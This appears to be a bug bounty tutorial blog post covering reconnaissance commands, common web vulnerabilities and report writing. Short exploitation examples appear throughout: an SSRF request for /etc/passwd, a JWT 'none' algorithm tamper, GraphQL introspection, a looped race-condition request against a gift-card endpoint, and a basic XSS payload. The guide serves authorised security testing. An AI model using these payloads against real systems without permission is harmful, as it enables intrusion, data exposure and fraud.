Bug bounty hunting remains a lucrative and exciting field in 2025. This guide provides a structured approach to hacking a target, the types of vulnerabilities that are still common, and how to exploit them. 

## 1. Understanding the Target

Before diving into active reconnaissance, start with a passive approach:

### Passive Recon
- **Google Dorking**: Use search operators like:
  ```bash
  site:target.com intitle:"index of"
  site:target.com ext:log
  ```
- **Wayback Machine**: Check archived versions for exposed endpoints.
- **GitHub Recon**:
  ```bash
  github-subdomains -d target.com
  ```
  Look for API keys and secrets in GitHub repositories.

### Active Recon
- **Subdomain Enumeration**:
  ```bash
  subfinder -d target.com | httprobe
  amass enum -d target.com
  ```
- **Port Scanning**:
  ```bash
  nmap -p- -sC -sV target.com
  ```
- **Directory Enumeration**:
  ```bash
  ffuf -w wordlist.txt -u https://target.com/FUZZ -fc 403
  ```

## 2. Common Vulnerabilities & Exploits in 2025

### 2.1. Server-Side Request Forgery (SSRF)
**What?** An attacker forces the server to make HTTP requests on their behalf.

**Where to look?**
- Image upload features.
- Webhooks and API integrations.

**Exploitation Example:**
```bash
curl -X POST https://target.com/api/fetch -d 'url=file:///etc/passwd'
```

### 2.2. JSON Web Token (JWT) Attacks
**What?** JWTs used for authentication can be tampered with.

**Where to look?**
- Login authentication mechanisms.

**Exploitation Example:**
```bash
jwt_tool token.jwt -I -S -d
```
If `none` algorithm is supported, modify and resign:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

### 2.3. GraphQL Injections
**What?** Overly permissive GraphQL APIs expose sensitive data.

**Where to look?**
- `https://target.com/graphql` endpoint.

**Exploitation Example:**
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

### 2.4. Race Conditions
**What?** Executing multiple requests simultaneously to bypass restrictions.

**Where to look?**
- Password reset mechanisms.
- Gift card redemption systems.

**Exploitation Example:**
```bash
while true; do curl -X POST https://target.com/redeem -d "code=FREE100"; done
```

### 2.5. DOM-based XSS
**What?** JavaScript manipulation leading to client-side attacks.

**Where to look?**
- User input reflected in JS variables.

**Exploitation Example:**
```html
<script>alert(document.domain)</script>
```

## 3. Post-Exploitation and Reporting

### Gaining Further Access
- If you find **LFI**, escalate to **RCE**.
- If you find **IDOR**, combine it with **Privilege Escalation**.

### Writing a Good Report
- Include **POC (Proof of Concept)** videos.
- Detail the **impact** of the vulnerability.
- Suggest **mitigations**.

### Example Report Structure
```
# Vulnerability: SSRF in Webhook Function

## Description
The webhook endpoint allows external URL requests without proper validation.

## Steps to Reproduce
1. Send a POST request to the webhook endpoint with an internal IP.
2. Observe that internal services are accessible.

## Impact
This vulnerability allows access to internal resources, leading to potential RCE.

## Suggested Fix
Validate user-supplied URLs and restrict internal IP ranges.
```

## 4. Essential Tools for Bug Bounty Hunters

- **Burp Suite** - HTTP interception & automation.
- **FFUF** - Directory fuzzing.
- **Nuclei** - Automated vulnerability scanning.
- **Subfinder & Amass** - Subdomain enumeration.
- **JWT Tool** - JWT attacks.
- **GraphQLmap** - GraphQL testing.

## 5. Conclusion
Bug bounty hunting in 2025 still requires creativity and persistence. While automation helps, a hacker's mindset is irreplaceable. Keep learning, keep testing, and most importantly, have fun hacking!
